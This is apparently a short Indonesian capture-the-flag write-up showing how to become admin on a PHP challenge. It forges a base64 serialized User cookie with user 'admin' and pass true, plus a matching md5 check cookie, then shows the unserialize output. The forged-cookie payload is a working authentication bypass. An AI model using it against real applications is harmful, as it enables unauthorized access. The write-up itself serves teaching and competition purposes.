* Cookie auth merupakan serialize dari objek User dengan user-> admmin dan pass-> True + diencode ke base64. Adapun cookie check merupakan hasil encode base64 dari md5       cookie auth. Jadi untuk mendaptkan admin, peserta harus membuat payload objek untuk diserialize yang benar (seperti di bawah) dan mengencodenya ke base64 sebagai cookie auth. Lalu menghash md5 
dari hasil cookie auth sebagai cookie check. 

  Lebih lengkap:
  ```
  <?php
  $_COOKIE['auth'] = 'Tzo0OiJVc2VyIjoyOntzOjQ6InVzZXIiO3M6NToiYWRtaW4iO3M6NDoicGFzcyI7YjoxO30=';
  //O:4:"User":2:{s:4:"user";s:5:"admin";s:4:"pass";b:1;} -> md5 -> 6897f0060a84ecb0600e4167d2a748e4

  $_COOKIE['check'] = 'Njg5N2YwMDYwYTg0ZWNiMDYwMGU0MTY3ZDJhNzQ4ZTQ=';
  //base64 6897f0060a84ecb0600e4167d2a748e4

  var_dump(md5($_COOKIE['auth']));
  var_dump(base64_decode($_COOKIE['check']));

  if(md5($_COOKIE['auth']) === base64_decode($_COOKIE['check'])) {
      $login = unserialize(base64_decode($_COOKIE['auth']));
      var_dump($login);
  }else {

  }
  ```
  
  ```
  string(32) "6897f0060a84ecb0600e4167d2a748e4"
  string(32) "6897f0060a84ecb0600e4167d2a748e4"
  object(__PHP_Incomplete_Class)#1 (3) {
  ["__PHP_Incomplete_Class_Name"]=>
  string(4) "User"
  ["user"]=>
  string(5) "admin"
  ["pass"]=>
  bool(true)
  }
  ```
